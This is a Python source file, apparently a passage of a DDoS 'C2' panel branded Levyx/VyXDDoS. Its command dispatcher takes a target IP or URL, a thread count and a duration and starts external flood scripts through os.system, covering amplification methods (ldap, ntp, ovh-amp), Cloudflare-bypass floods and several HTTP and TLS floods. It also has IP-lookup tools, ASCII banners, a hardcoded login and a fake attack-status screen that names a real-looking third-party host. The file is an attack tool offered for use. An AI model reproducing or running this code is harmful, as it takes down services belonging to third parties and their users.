                print('Usage: samp <ip> <port>')
                print('Example: samp 1.1.1.1 7777')

        elif "ldap" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python ldap {ip} {port} {thread} -1 {time}')
            except IndexError:
                print('Usage: ldap <ip> <port> <threads> <time>')
                print('Example: ldap 1.1.1.1 80 650 60')

        elif "minecraft" in cnc:
            try:
                ip = cnc.split()[1]
                throttle = cnc.split()[2]
                threads = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python MINECRAFT-SLAM {ip} {threads} {time}')
            except IndexError:
                print('Usage: minecraft <ip> <throttle> <threads> <time>')
                print('Example: minecraft 1.1.1.1 5000 500 60')

        elif "ovh-amp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                os.system(f'python OVH-AMP {ip} {port}')
            except IndexError:
                print('Usage: ovh-amp <ip> <port>')
                print('Example: ovh-amp 1.1.1.1 80')
                
        elif "ntp" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                throttle = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'python ntp {ip} {port} ntp.txt {throttle} {time}')
            except IndexError:
                print('Usage: ntp <ip> <port> <throttle> <time>')
                print('Example: ntp 1.1.1.1 22 250 60')

# LAYER 7 METHODS


        elif "http-fuzz" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node httpfuzz.js {url} proxies.txt {time} POST')
            except IndexError:
                print(f'Usage: http-fuzz <url> <time>')
                print("Example: http-fuzz http://sexo.org 30")
        elif "http-dstat" in cnc:
            try:
                url = cnc.split()[1]
                connections = cnc.split()[2]
                rps = cnc.split()[3]
                os.system(f'perl dstat.pl {url} {connections} {rps} 13.87')
            except IndexError:
                print('Usage: http-dstat <url> <connections> <rps>')
                print('Example: http-dstat http://example.org 50000 50000')        
 
        elif "ovh-beam" in cnc:
            try:
                method = cnc.split()[1]
                ip = cnc.split()[2]
                port = cnc.split()[3]
                time = cnc.split()[4] 
                os.system(f'python OVH-BEAM {method} {ip} {port} {time} 1024')
            except IndexError:
                print('Usage: ovh-beam <GET/HEAD/POST/PUT> <ip> <port> <time>')
                print('Example: ovh-beam GET 51.38.92.223 80 60')
    
        elif "https-spoof" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python3 https-spoof.py {url} {time} {thread}')
            except IndexError:
                print('Usage: https-spoof <url> <time> <threads>')
                print('Example: https-spoof http://vailon.com 60 500')
    
        elif "slow" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node slow.js {url} {time}')
            except IndexError:
                print('Usage: slow <url> <time>')
                print('Example: slow http://vailon.com 60')
    
        elif "hyper" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node hyper.js {url} {time}')
            except IndexError:
                print('Usage: hyper <url> <time>')
                print('Example: hyper http://vailon.com 60')
                
        elif "cf-socket" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'python3 bypass.py {url} {time}')
            except IndexError:
                print('Usage: cf-socket <url> <thread> <time>')
                print('Example: cf-socket http://vailon.com 5000 60')
    
        elif "cf-pro" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'python3 cf-pro.py {url} {time}')
            except IndexError:
                print('Usage: cf-pro <url> <thread> <time>')
                print('Example: cf-pro http://vailon.com 5000 60')
        
        elif "http-socket" in cnc:
            try:
                url = cnc.split()[1]
                per = cnc.split()[2]
                time = cnc.split()[3]
                os.system(f'node HTTP-SOCKET {url} {per} {time}')
            except IndexError:
                print('Usage: http-socket <url> <per> <time>')
                print('Example: http-socket http://example.com 5000 60')

        elif "http-raw" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAW {url} {time}')
            except IndexError:
                print('Usage: http-raw <url> <time>')
                print('Example: http-raw http://example.com 60')

        elif "http-requests" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'python3 HTTP-REQUESTS {url} {time}')
            except IndexError:
                print('Usage: http-requests <url> <time>')
                print('Example: http-requests http://example.org 60')

        elif "http-rand" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                os.system(f'node HTTP-RAND.js {url} {time}')
            except IndexError:
                print('Usage: http-rand <url> <time>')
                print('Example: http-rand http://vailon.com/ 60')

        elif "overflow" in cnc:
            try:
                ip = cnc.split()[1]
                port = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'python OVERFLOW {ip} {port} {thread}')
            except IndexError:
                print('Usage: overflow <ip> <port> <threads>')
                print('Example: overflow 1.1.1.1 80 5000')

        elif "cf-bypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                thread = cnc.split()[3]
                os.system(f'node cf.js {url} {time} {thread}')
            except IndexError:
                print('Usage: cf-bypass <url> <time> <threads>')
                print('Example: cf-bypass http://example.com 60 1250')

        elif "uambypass" in cnc:
            try:
                url = cnc.split()[1]
                time = cnc.split()[2]
                per = cnc.split()[3]
                os.system(f'node uambypass.js {url} {time} {per} http.txt')
            except IndexError:
                print('Usage: uambypass <url> <time> <req_per_ip>')
                print('Example: uambypass http://example.com 60 1250')
        elif "TLS" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run TLS.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')        

        elif "TLS-VIP" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run TLS.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')
        elif "BROWSER-VIP" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run BROWSER.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')        
                
        elif "HTTP-VIP" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run HTTP.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')      
        elif "HTTPS-VIP" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run HTTPS.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')       
        elif "CRASH-VIP" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run CRASH.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')     
        elif "LEVYX-VIP" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run LEVYX.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')       
                
        elif "SOCKET-VIP" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run SOCKET.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')     
                
        elif "SSH-VIP" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run SSH.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')       
        elif "KILL-VIP" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run KILL.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')                                           
        elif "TLS-VIP" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run TLS.go -site {url} -data {method}')
            except IndexError:
                print('Usage: TLS <url> METHODS<GET/POST>')
                print('Example: TLS http://example.com GET')        

        elif "crash" in cnc:
            try:
                url = cnc.split()[1]
                method = cnc.split()[2]
                os.system(f'go run Hulk.go -site {url} -data {method}')
            except IndexError:
                print('Usage: crash <url> METHODS<GET/POST>')
                print('Example: crash http://example.com GET')

        elif "httpflood" in cnc:
            try:
                url = cnc.split()[1]
                thread = cnc.split()[2]
                method = cnc.split()[3]
                time = cnc.split()[4]
                os.system(f'go run httpflood.go {url} {thread} {method} {time} nil')
            except IndexError:
                print('Usage: httpflood <url> <threads> METHODS<GET/POST> <time>')
                print('Example: httpflood http://example.com 15000 get 60')

        elif "httpget" in cnc:
            try:
                url = cnc.split()[1]
                os.system(f'python httpget {url} 10000 50 100')
            except IndexError:
                print('Usage: httpget <url>')
                print('Example: httpget http://example.com')

# BANNERS

        elif "troll" in cnc:
                print('░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░   ')
                print('░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░  ')
                print('░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░  ')
                print('░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░  ')
                print('░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░  ')
                print('█░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█  ')
                print('█░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█  ')
                print('░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░  ')
                print('░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░  ')
                print('░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░  ')
                print('░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░  ')
                print('░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░  ')
                print('░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░  ')
                print('░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░  ')
                print('░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░  ')

        elif "pikachu" in cnc:
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠁⠀⠹⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡇⠀⠀⠀⢿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡏⠀⠀⠀⠀⣾⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⠃⠀⠀⠐⠚⠻⢷⣦⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⣠⡾⠿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⣰⠟⢁⣀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⢠⣾⠟⠁⠀⠀⠙⢿⣦⣄⠀⠀⠀⠀⣼⠏⣼⣧⣼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⣴⡿⠃⠀⠀⠀⠀⠀⠀⠉⠻⣷⣤⣤⡾⢿⠐⣿⡿⠃⠀⠀⠀⢀⡖⠒⣦⡀⠀⠀⠀⠀⠈⠙⠛⠷⣦⣄⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⢠⣾⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡿⠁⢸⠀⠀⣤⡄⠀⠀⠀⢸⣧⣤⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣶⣄⠀⠀⠀  ')
                print('⠀⠀⣰⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇⡠⠃⠀⣀⡈⠀⠀⠀⠀⠘⢿⣿⣿⠟⠀⠀⠀⠀⠠⣄⠀⠀⠀⠀⠀⠈⢻⣷⣄⠀  ')
                print('⠀⣰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢹⡟⠓⣶⠀⠀⠀⠀⣨⣤⣤⡀⠀⠀⠀⠀⢸⣿⣶⣦⣤⣶⣾⣿⣿⣿⣆  ')
                print('⢠⣿⣷⣶⣶⣶⣶⣤⣤⣤⣤⣄⣀⡀⠀⠀⠀⠀⠘⣧⠀⠀⠈⣄⠀⡏⠀⠀⠀⢸⣿⣿⣿⣿⠀⠀⠀⠀⣸⡟⠀⠉⠙⠛⠛⠿⠿⠿⠛  ')
                print('⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⣹⣿⠟⠋⠀⠀⣠⣴⡿⠿⣷⣄⠀⠈⠓⠁⠀⠀⠀⠈⠿⣿⡿⠏⠀⠀⠀⢀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠁⠀⠀⠀⢾⣿⣯⡀⠀⢸⡏⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠒⠛⠛⠿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠿⢿⣶⣦⣤⣀⠈⠙⢿⣶⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇⠀⠀⠀⠀⠈⣿⡀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⡿⠃⣠⣿⢋⣽⣷⠀⠀⠀⠀⠉⠳⢦⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣷⣶⣿⣧⣾⣿⣿⡆⠀⠀⠀⠀⠀⠀⠹⣆⠀⠀⠀⠈⠻⢦⣤⣤⣴⡟⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⢿⣿⣿⣿⣿⣿⠋⠉⠛⠃⠀⠀⠀⠀⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣧⡀⠀⠀⠀⠈⠳⣤⡀⠀⠀⠀⢀⡗⠀⠀⠀⠀⠀⠀⠀⠈⣿⡆⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⣿⣿⣿⣷⡄⠀⠀⠀⠀⠈⠙⠓⠶⠶⠞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⠀⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡿⠛⠋⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣇⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣷⡀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣷⡀⠀⠀⠀⠀⠀⠀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⠀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣤⠀⠀⠀⠀⣰⠃⠀⠀⠀⠀⠀⠀⣀⣠⣤⣾⠁⠀⠀⠀⣸⣿⡀⠀⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣉⣀⣀⣀⣤⣾⣿⣷⣶⣶⣶⣿⡿⠿⠿⠛⠛⠿⣷⣤⣄⡈⠀⠉⣿⡆⠀⠀⠀⠀  ')
                print('⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⠿⠿⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠁⠀⠀⠀⠀  ')

                
# TOOLS
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')

        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')                

        elif "cloudflare-lag" in cnc:
            print('Method "CLOUDFLARE-LAG" not enabled')
           
def VipMethod():
    clear()
    si()
    print(f'''
    
    

\x1b[38;2;0;255;255m                                ██╗   ██╗██╗██████╗
\x1b[38;2;0;255;255m                                ██║   ██║██║██╔══██╗
\x1b[38;2;0;255;255m                                ██║   ██║██║██████╔╝
\x1b[38;2;0;255;255m                                ╚██╗ ██╔╝██║██╔═══╝
\x1b[38;2;0;255;255m                                 ╚████╔╝ ██║██║
\x1b[38;2;0;255;255m                                  ╚═══╝  ╚═╝╚═╝
                            🚀 𝙻𝚎𝚟𝚢𝚡 𝙲2 𝙿𝚘𝚠𝚎𝚛𝚙𝚛𝚘𝚘𝚏𝚝 🚀
\x1b[38;2;0;255;255m                     • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•  \x1b[38;2;0;255;255m     • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m • \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m• \x1b[38;2;0;255;255m•     \x1b[38;2;0;255;255m  • \x1b[38;2;0;255;255m•\x1b[38;2;0;255;255m •\x1b[38;2;0;255;255m •                            
\x1b[38;2;0;255;255m╔═══                                                                           ═══╗

\x1b[38;2;0;255;255m        ╔═══                                                       
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m http-raw                \x1b[38;2;0;49;147m  • \x1b[38;2;0;255;255mhttpget                 \x1b[38;2;0;49;147m    •\x1b[38;2;0;255;255m overflow
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m http-socket            \x1b[38;2;0;49;147m   • \x1b[38;2;0;255;255mhttpflood                \x1b[38;2;0;49;147m   •\x1b[38;2;0;255;255m cf-pro     
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m http-requests         \x1b[38;2;0;49;147m    • \x1b[38;2;0;255;255muambypass               \x1b[38;2;0;49;147m    •\x1b[38;2;0;255;255m cf-socket             
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m http-rand            \x1b[38;2;0;49;147m     • \x1b[38;2;0;255;255mcf-bypass             \x1b[38;2;0;49;147m      • \x1b[38;2;0;255;255mhyper        
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m https-spoof            \x1b[38;2;0;49;147m   • \x1b[38;2;0;255;255mcrash                   \x1b[38;2;0;49;147m    •\x1b[38;2;0;255;255m ovh-beam      
          
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m udpbypass              \x1b[38;2;0;49;147m   • \x1b[38;2;0;255;255mtcp                     \x1b[38;2;0;49;147m    • \x1b[38;2;0;255;255mldap                 
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m stdv2                 \x1b[38;2;0;49;147m    • \x1b[38;2;0;255;255movh-raw                   \x1b[38;2;0;49;147m  •\x1b[38;2;0;255;255m std               
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m flux                  \x1b[38;2;0;49;147m    • \x1b[38;2;0;255;255mnfo-killer               \x1b[38;2;0;49;147m   • \x1b[38;2;0;255;255mdestroy            
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m slowloris               \x1b[38;2;0;49;147m  •\x1b[38;2;0;255;255m udp                      \x1b[38;2;0;49;147m   • \x1b[38;2;0;255;255mstress             
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m god                   \x1b[38;2;0;49;147m    • \x1b[38;2;0;255;255mhome                     \x1b[38;2;0;49;147m   •\x1b[38;2;0;255;255m samp
\x1b[38;2;0;49;147m         •\x1b[38;2;0;255;255m ntp                   \x1b[38;2;0;49;147m    • \x1b[38;2;0;255;255movh-amp                   \x1b[38;2;0;49;147m  •\x1b[38;2;0;255;255m minecraft                 ╚════                                                            
                                                       
\x1b[38;2;0;255;255m╚════                                                                        ════╝
  

\x1b[38;2;0;255;255m                          ╔═════════════════════════════╗
\x1b[38;2;0;255;255m                               VVIP METHODS : TLS-VIP
\x1b[38;2;0;255;255m                          ╚═════╦══════════════════╦════╝       
╔═══════════════════════════════════════╗  ╔══════════════════════════════════════╗
\x1b[38;2;0;255;255m     Methods <url> <time> <threads>             Methods <url> <time> <threads> 
╚═══════════════════════════════════════╝  ╚══════════════════════════════════════╝                                                   
                                                                             

''')           


def help():
    clear()
    print('\u001B[35mWelcome To :\x1b[38;2;0;2555m Levyx C2 | TELEGRAM : [t.me/levyxc2 | [@Levyxnet] ')
    print(f'''
    
    
\x1b[38;2;0;49;147m                       ▄▄▌  ▄▄▄ . ▌ ▐· ▄· ▄▌▐▄• ▄ 
\x1b[38;2;0;49;147m                       ██•  ▀▄.▀·▪█·█▌▐█▪██▌ █▌█▌▪
\x1b[38;2;0;49;147m                       ██▪  ▐▀▀▪▄▐█▐█•▐█▌▐█▪ ·██· 
\x1b[38;2;0;49;147m                       ▐█▌▐▌▐█▄▄▌ ███  ▐█▀·.▪▐█·█▌
\x1b[38;2;0;49;147m                       .▀▀▀  ▀▀▀ . ▀    ▀ • •▀▀ ▀▀
                                      
          \x1b[38;2;0;49;147m╔═════════════════════════════════════════════════════╗
          ║     ║\x1b[38;2;0;212;14mVipMethod \x1b[38;2;0;49;147m► PENGGUNA VVIP 
          ║     ║\x1b[38;2;0;212;14mLAYER7  \x1b[38;2;0;49;147m► SHOW LAYER7 METHODS
          ║     ║\x1b[38;2;0;212;14mLAYER4  \x1b[38;2;0;49;147m► SHOW LAYER4 METHODS
          ║     ║\x1b[38;2;0;212;14mAMP     \x1b[38;2;0;49;147m► SHOW AMP METHODS
          ║     ║\x1b[38;2;0;212;14mSPECIAL \x1b[38;2;0;49;147m► SHOW SPECIAL METHODS
          ║     ║\x1b[38;2;0;212;14mBANNERS \x1b[38;2;0;49;147m► SHOW BANNERS
          ║     ║\x1b[38;2;0;212;14mRULES   \x1b[38;2;0;49;147m► RULES PANEL
          ║     ║\x1b[38;2;0;212;14mPORTS   \x1b[38;2;0;49;147m► SHOW ALL PORTS
          ║     ║\x1b[38;2;0;212;14mTOOLS   \x1b[38;2;0;49;147m► SHOW TOOLS
          ║     ║\x1b[38;2;0;212;14mCLEAR   \x1b[38;2;0;49;147m► CLEAR TERMINAL
\x1b[38;2;0;49;147m          ╚══════════════════════╩══════════════════════════════╝
            ''')

def fake():
    clear()
    print(f'''    
    
\u001B[35m                  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═  ╔═╗╔═╗╔╗╔╔╦╗
\u001B[35m                  ╠═╣ ║  ║ ╠═╣║  ╠╩╗  ╚═╗║╣ ║║║ ║║
\u001B[35m                  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩  ╚═╝╚═╝╝╚╝═╩╝
                  ════════╦══════════════╦═════════
\u001B[35m          ╔═══════════════╩══════════════╩══════════════════╗
\u001B[35m             HOST    ► [ \x1b[38;2;0;255;255mhttp://call-center.gruppomediacom.it/\u001B[35m ]   
\u001B[35m             PORT    ► [\x1b[38;2;0;255;255m 80 \u001B[35m] 
\u001B[35m             TIME    ► [ \x1b[38;2;0;255;255m60\u001B[35m ] 
\u001B[35m             METHOD  ► [\x1b[38;2;0;255;255m TLS \u001B[35m] 
\u001B[35m             USER    ► [\x1b[38;2;0;255;255m root \u001B[35m] 
\u001B[35m             COLDOWN ► [ \x1b[38;2;0;255;255m0 \u001B[35m] 
\u001B[35m          ╚═════════════════════════════════════════════════╝
            ''')                 
              
def ongoing():
    print(f'''       Running    
    
#    |        HOST          |   PORT       |     TIME     |
_____|______________________|______________|______________|
     |    37.207.250.109    |   80         |      60      |
1    |                      |              |              |
            ''')



def login():
    clear()
    user = "*"
    passwd = "*"
    username = input("⚡ Username: ")
    password = getpass.getpass(prompt='⚡ Password: ')
    if username != user or password != passwd:
        print("")
        print("⚡ PROSES...... ")
        time.sleep(6)
        print("⚡ LOGIN GAGAL SILAHKAN ROOT TERLEBIH DAHULU ")
        sys.exit(1)
    elif username == user and password == passwd:
        print("⚡ PROSES...... ")
        time.sleep(6)
        print("⚡ LOGIN SUKCES ")
        print("⚡ Welcome Bro To VyXDDoS C2")
        time.sleep(0.3)
        main() 

login()





